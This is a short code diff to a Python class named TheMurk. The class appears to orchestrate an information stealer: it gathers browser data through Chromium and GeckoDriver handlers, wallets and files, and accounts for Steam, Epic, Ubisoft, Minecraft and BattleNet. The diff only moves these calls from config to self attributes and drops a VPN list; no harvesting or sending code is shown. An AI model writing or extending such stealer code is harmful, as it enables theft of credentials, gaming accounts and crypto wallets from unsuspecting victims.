@@ -25,7 +25,6 @@ class TheMurk:
         self.msgOther =[]
         self.msgWallets =[]
         self.msgFiles = []
-        self.msgVPN = []
     
     def Progress(self):
         self.Start()
@@ -45,13 +44,13 @@ class TheMurk:
             TxtFiles()
     
     def Browsers(self):
-        config.msgBrowsers = Chromium()
-        config.msgBrowsers = GeckoDriver(config.msgBrowsers)
+        self.msgBrowsers = Chromium()
+        self.msgBrowsers = GeckoDriver(self.msgBrowsers)
 
 
     def Games(self):
-        config.msgOther = Steam(config.msgOther)
-        config.msgOther = Epic(config.msgOther)
-        config.msgOther = Ubisoft(config.msgOther)
-        config.msgOther = Minecraft(config.msgOther)
-        config.msgOther = BattleNet(config.msgOther)
+        self.msgOther = Steam(self.msgOther)
+        self.msgOther = Epic(self.msgOther)
+        self.msgOther = Ubisoft(self.msgOther)
+        self.msgOther = Minecraft(self.msgOther)
+        self.msgOther = BattleNet(self.msgOther)
